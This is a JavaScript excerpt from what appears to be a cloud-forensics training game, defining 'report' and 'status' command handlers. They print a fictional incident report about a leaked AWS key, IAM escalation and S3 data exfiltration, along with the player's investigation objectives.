                if (missing.length > 0) {
                    e.printLine('Cannot build report yet. Still needed:', 'warning');
                    for (var i = 0; i < missing.length; i++) { e.printLine('  \u2014 ' + missing[i], 'error'); }
                    e.printLine('', 'system');
                    e.printLine('Sources examined: ' + examined + '/8', 'info');
                    return;
                }

                e.printLine('', 'system');
                e.printLine('=== INCIDENT REPORT: CLOUD-2026-0305 ===', 'heading');
                e.printLine('', 'system');
                e.printLine('SUMMARY: Cloud infrastructure breach via compromised API key', 'node-info');
                e.printLine('', 'system');
                e.printLine('TIMELINE:', 'heading');
                e.printLine('[02/28] API key (AKIAEXAMPLE123) committed to public GitHub repo', 'warning');
                e.printLine('[03/03 01:14] Attacker authenticates from Tor (91.234.xx.xx)', 'error');
                e.printLine('[03/03 01:15] IAM privilege escalation \u2014 s3:*, lambda:*, iam:*', 'error');
                e.printLine('[03/03 01:18] S3 exfiltration \u2014 847MB customer data (2.3M records)', 'error');
                e.printLine('[03/03 01:20] Lambda backdoor installed for persistent access', 'error');
                e.printLine('[03/03 01:22] S3 bucket policy changed to public read', 'error');
                e.printLine('', 'system');
                e.printLine('IMPACT:', 'heading');
                e.printLine('  \u2014 2.3M customer records exposed (PII: names, emails, SSN)', 'error');
                e.printLine('  \u2014 Lambda function compromised for ongoing exfiltration', 'error');
                e.printLine('  \u2014 S3 bucket exposed to public internet', 'error');
                e.printLine('', 'system');
                e.printLine('ROOT CAUSE: Unrotated API key exposed in public repository', 'warning');
                e.printLine('', 'system');
                e.printLine('MITRE ATT&CK: T1078.004 \u2192 T1098 \u2192 T1530 \u2192 T1567', 'node-info');
                e.printLine('', 'system');
                e.printLine('INCIDENT REPORT COMPLETE.', 'success');

                s.reportBuilt = true;
                e.printLine('', 'system');
                e.checkObjectives(); e.updateGrid(); e.saveState();
            }
        },

        // --- STATUS (override: cloud forensics-specific display) ---
        'status': {
            help: 'Show sources examined and objectives',
            handler: function(args, ctx) {
                var e = ctx.engine, s = ctx.state, c = ctx.config;
                var cellType = c.grid.cells[s.position.row][s.position.col];
                var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? c.nodes[cellType].label : 'No service';
                var examined = s.sourcesExamined.length;

                e.printLine('', 'system');
                e.printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
                e.printLine('Position: (' + s.position.col + ',' + s.position.row + ') \u2014 ' + posLabel, 'info');
                e.printLine('Services discovered: ' + s.nodesDiscovered.size + ' / 8', 'info');
                e.printLine('Sources examined: ' + examined + ' / 8', 'info');
                e.printLine('Commands used: ' + s.agentCmdCount, 'info');
                e.printLine('', 'system');
                e.printLine('Compromised key found:   ' + (s.compromisedKeyFound ? 'YES \u2014 AKIAEXAMPLE123' : 'NO'), s.compromisedKeyFound ? 'success' : 'warning');
                e.printLine('IAM escalation traced:   ' + (s.iamEscalationTraced ? 'YES' : 'NO'), s.iamEscalationTraced ? 'success' : 'warning');
                e.printLine('Exfil data determined:   ' + (s.exfilDataDetermined ? 'YES \u2014 2.3M records, 847MB' : 'NO'), s.exfilDataDetermined ? 'success' : 'warning');
                e.printLine('Incident report built:   ' + (s.reportBuilt ? 'YES' : 'NO'), s.reportBuilt ? 'success' : 'warning');
                e.printLine('', 'system');
                e.printLine('Sources examined:', 'heading');
                var allSources = c.allSources;
                for (var i = 0; i < allSources.length; i++) {
                    var src = allSources[i];
                    var done = s.sourcesExamined.indexOf(src) !== -1;
                    var info = c.nodes[src];
                    e.printLine((done ? ' [X] ' : ' [ ] ') + info.label, done ? 'success' : 'system');
                }

                e.printLine('', 'system');
                e.printLine('Objectives:', 'heading');
                var objText = [
                    'Find compromised key (examine SECRETS-MGR)',
                    'Trace IAM escalation (examine IAM-CONSOLE)',
                    'Determine exfil data (examine S3-BUCKET)',
                    'Build incident report ("report" with 5+ sources)'
                ];
                for (var j = 0; j < s.objectives.length; j++) {
                    e.printLine((s.objectives[j] ? ' [X] ' : ' [ ] ') + objText[j], s.objectives[j] ? 'success' : 'system');
                }
            }
        }
    }
};
